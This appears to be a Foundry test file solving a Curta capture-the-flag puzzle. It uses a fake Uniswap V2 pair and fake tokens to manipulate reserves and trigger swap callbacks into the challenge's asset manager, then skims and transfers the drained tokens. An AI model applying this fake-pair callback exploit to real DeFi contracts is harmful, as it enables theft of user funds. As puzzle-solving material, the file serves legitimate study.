// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Curta.sol";

contract SolveTest is Test {
    Puzzle public curta;
    Challenge public chall;
    UniswapV2Pair public fakePair;
    FakeToken public fakeToken1;
    FakeToken public fakeToken2;

    function setUp() public {
        curta = new Puzzle();
        curta.deploy();
    }

    function testSolve() public {
        chall = curta.factories(curta.generate(address(this)));

        fakePair = new UniswapV2Pair();
        fakeToken1 = new FakeToken();
        fakeToken2 = new FakeToken();

        fakeToken1.mint(address(fakePair), 10000 ether);
        fakeToken2.mint(address(fakePair), 1 ether);

        fakePair.initialize(address(fakeToken1), address(fakeToken2));
        fakePair.sync();
        fakeToken2.mint(address(fakePair), type(uint64).max);
        fakePair.swap(
            0,
            1 ether - 1,
            address(chall.assetManager()),
            abi.encode(
                chall.curtaUSD(),
                chall.curtaStUSD(),
                IERC20(chall.curtaUSD()).balanceOf(address(chall.keeper())),
                IERC20(chall.curtaStUSD()).balanceOf(address(chall.keeper()))
            )
        );

        fakeToken1.burn(address(fakePair), fakeToken1.balanceOf(address(fakePair)));
        fakeToken2.burn(address(fakePair), fakeToken2.balanceOf(address(fakePair)));
        fakePair.sync();

        fakeToken1.mint(address(fakePair), 1 ether);
        fakeToken2.mint(address(fakePair), 10000 ether);
        fakePair.sync();

        fakeToken1.mint(address(fakePair), type(uint64).max);
        fakePair.swap(
            1 ether - 1,
            0,
            address(chall.assetManager()),
            abi.encode(
                chall.curtaUSD(),
                chall.curtaStUSD(),
                IERC20(chall.curtaUSD()).balanceOf(address(chall.keeper())),
                IERC20(chall.curtaStUSD()).balanceOf(address(chall.keeper()))
            )
        );

        fakeToken1.burn(address(fakePair), fakeToken1.balanceOf(address(fakePair)));
        fakeToken2.burn(address(fakePair), fakeToken2.balanceOf(address(fakePair)));
        fakePair.sync();

        fakePair.initialize(address(chall.curtaUSD()), address(chall.curtaStUSD()));
        fakePair.skim(address(this));

        IERC20(chall.curtaUSD()).transfer(
            address(uint160(curta.generate(address(this)))), IERC20(chall.curtaUSD()).balanceOf(address(this))
        );
        IERC20(chall.curtaStUSD()).transfer(
            address(uint160(curta.generate(address(this)))), IERC20(chall.curtaStUSD()).balanceOf(address(this))
        );

        curta.verify(curta.generate(address(this)), uint256(0));
    }

    function feeTo() external view returns (address) {
        return address(0);
    }
}

contract FakeToken is ERC20 {
    constructor() ERC20("Fake", "fake") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function burn(address to, uint256 amount) external {
        _burn(to, amount);
    }
}
